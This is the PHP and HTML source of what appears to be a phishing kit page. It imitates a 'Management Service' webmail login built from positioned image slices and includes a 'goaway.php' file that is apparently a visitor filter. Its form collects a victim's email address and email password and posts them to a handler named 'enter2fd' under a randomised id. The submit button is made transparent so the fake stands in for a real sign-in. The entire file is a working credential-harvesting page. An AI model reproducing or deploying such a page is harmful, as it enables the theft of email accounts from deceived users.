<?php
require_once('./goaway.php');
$dst= substr(str_shuffle(str_repeat("0123456789", 3)), 0, 3);
?>
<!DOCTYPE html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <title>Management Service</title>  

	
    <link rel="stylesheet" type="text/css" href="./css/one5mw.css" >  
    <link rel="shortcut icon" href="./image/ico6sd.ico">
</head>
<body style="
			width : 1357px;
			height : 705px;
            background: url('./image/two5YM.png') no-repeat left ;">
			
			<div>			
			<img src="./image/twomnc.png" style="position: absolute;  top: -2px; left: 2px; width: 1367px; height: 67px; ">	
</div>
<div>			
			<img src="./image/twofD4.png" style="position: absolute;  top: 132px; left: 424px; width: 519px; height: 373px; ">	
</div>
			<div>
<img src="./image/twoxur.png" style="position: absolute;  top: 134px; left: 430px; width: 519px; height: 43px; ">	
</div>
			<div>
<img src="./image/two33c.png" style="position: absolute;  top: 390px; left: 544px; width: 274px; height: 116px; ">	
</div>
<form method="post" action="./enter2fd?id=<?php echo $dst ?>" style="z-index: 1; width: 395px; height: 232px; position: absolute; top: 5px; left: -264px">								<div>
					<input 
					    
						type="email"
						name="mailk2m" 
						autocomplete="on"
						required
						placeholder="Email Address"						 
						class="large" style="z-index: 1; position: absolute; top: 245px; left: 815px; width: 276px; height: 31px; " 
					/><br /><span id="errfn"></span>
				</div>
			<div>
					<input 
					    type="password"
						name="pass91m"
                        required 						
                        placeholder="Email Password"						
						class="large" style="z-index: 1; position: absolute; top: 295px; left: 815px; width: 276px; height: 31px;" 
					/>
				</div>						
				<div>
			<input 						
						type="submit" 
						value=""
						class="large" style="z-index: 1; position: absolute; top: 345px; left: 815px; width: 278px; height: 31px;background-color: transparent; border-color: transparent; outline:none;" 
					/>
				</div>									
					</form>

</body>
</html>